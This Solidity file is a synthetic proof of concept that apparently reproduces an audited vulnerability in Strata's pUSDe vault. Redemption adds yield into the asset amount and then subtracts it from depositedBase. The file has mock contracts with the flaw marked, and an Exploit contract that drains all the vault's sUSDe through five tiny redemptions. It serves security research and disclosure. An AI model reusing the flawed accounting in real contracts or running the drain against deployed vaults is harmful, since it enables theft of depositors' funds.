// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Strata — yield-phase yUSDe redemption drains the vault's sUSDe
    (Cyfrin / Dacian, Strata v2.1, 2025-06-11).
    SYNTHETIC, cheatcode-free. No time warp: yield is a direct USDe
    donation into sUSDe, which is what the report's PoC does.
    pUSDe._withdraw adds previewYield into `assets` and then subtracts
    that sum from depositedBase while transferring previewWithdraw of it.
    Five 1-share redemptions pull all 10 sUSDe. */

contract SUSDe {
    string public name = "sUSDe";
    string public symbol = "sUSDe";
    uint8 public decimals = 0;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    uint256 public usde;

    function mint(address to, uint256 usdeIn) external returns (uint256 shares) {
        if (totalSupply == 0) shares = usdeIn;
        else shares = usdeIn * totalSupply / usde;
        balanceOf[to] += shares;
        totalSupply += shares;
        usde += usdeIn;
    }

    function donate(uint256 usdeIn) external {
        usde += usdeIn;
    }

    function previewRedeem(uint256 shares) public view returns (uint256) {
        if (shares == 0 || totalSupply == 0) return 0;
        return shares * usde / totalSupply;
    }

    function previewWithdraw(uint256 assets) public view returns (uint256) {
        return (assets * totalSupply + usde - 1) / usde;
    }

    function transfer(address to, uint256 shares) external returns (bool) {
        balanceOf[msg.sender] -= shares;
        balanceOf[to] += shares;
        return true;
    }
}

contract PVault {
    SUSDe public susde;
    address public yVault;
    bool public yieldPhase;
    uint256 public depositedBase;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(SUSDe _susde) {
        susde = _susde;
    }

    function setYVault(address y) external {
        require(yVault == address(0), "y set");
        yVault = y;
    }

    function deposit(uint256 amount) external {
        susde.mint(address(this), amount);
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        depositedBase += amount;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function startYieldPhase() external {
        yieldPhase = true;
    }

    function previewYield(address caller, uint256 shares) public view returns (uint256) {
        if (yieldPhase && caller == yVault) {
            uint256 total_sUSDe = susde.balanceOf(address(this));
            uint256 total_USDe = susde.previewRedeem(total_sUSDe);
            uint256 total_yield_USDe = total_USDe - _min(total_USDe, depositedBase);
            uint256 y_pUSDeShares = balanceOf[caller];
            return total_yield_USDe * shares / y_pUSDeShares;
        }
        return 0;
    }

    function redeem(uint256 shares, address receiver, address owner) external {
        require(yieldPhase, "phase");
        _redeemYield(msg.sender, receiver, owner, shares, shares);
    }

    function _redeemYield(address caller, address receiver, address owner, uint256 assets, uint256 shares)
        internal
        virtual
    {
        if (PreDepositPhase.YieldPhase == currentPhase()) {
            // @> VULN: yield is added into assets, and depositedBase is later decreased by that sum.
            assets += previewYield(caller, shares);
            uint256 sUSDeAssets = susde.previewWithdraw(assets);
            _settle(caller, receiver, owner, assets, sUSDeAssets, shares);
        }
    }

    function currentPhase() public view returns (uint8) {
        return yieldPhase ? 1 : 0;
    }

    function _settle(
        address caller,
        address receiver,
        address owner,
        uint256 baseAssets,
        uint256 tokenAssets,
        uint256 shares
    ) internal {
        caller;
        owner;
        // @> VULN: baseAssets includes previewYield, so depositedBase falls by more than principal.
        depositedBase -= baseAssets;
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        susde.transfer(receiver, tokenAssets);
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

library PreDepositPhase {
    uint8 internal constant YieldPhase = 1;
}

contract YVault {
    PVault public p;
    mapping(address => uint256) public balanceOf;

    constructor(PVault _p) {
        p = _p;
    }

    function deposit(uint256 shares) external {
        p.transferFrom(msg.sender, address(this), shares);
        balanceOf[msg.sender] += shares;
    }

    function redeem(uint256 shares, address receiver) external {
        balanceOf[msg.sender] -= shares;
        p.redeem(shares, receiver, address(this));
    }
}

contract Exploit {
    SUSDe public susde; // nonce 1
    PVault public p; // nonce 2
    YVault public y; // nonce 3

    constructor() {
        susde = new SUSDe();
        p = new PVault(susde);
        y = new YVault(p);
        p.setYVault(address(y));
    }

    function run() external {
        p.deposit(5);
        p.deposit(5);
        y.deposit(5);
        p.startYieldPhase();
        susde.donate(5);
        for (uint256 i = 0; i < 5; i++) {
            y.redeem(1, address(this));
        }
        require(susde.balanceOf(address(this)) == 10, "attacker did not take all sUSDe");
        require(susde.balanceOf(address(p)) == 0, "protocol balance remains");
        require(p.depositedBase() == 0, "depositedBase not consumed");
    }
}
